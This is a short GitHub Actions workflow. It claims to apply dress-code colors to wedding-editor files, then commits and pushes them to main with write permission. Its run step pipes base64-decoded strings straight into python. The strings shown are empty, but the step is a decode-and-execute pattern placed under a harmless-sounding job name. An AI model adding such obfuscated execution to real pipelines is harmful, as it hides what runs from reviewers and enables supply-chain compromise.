name: Apply dress code content colors
on:
  push:
    branches:
      - main
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply requested controls
        run: |
          echo ' ' | base64 -d | python
          echo '' | base64 -d | python
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/creator/EditorWedding.jsx src/data/weddingSchema.js src/export/weddingOutput.js
          if git diff --cached --quiet; then exit 0; fi
          git commit -m "feat: add dress code content colors"
          git push
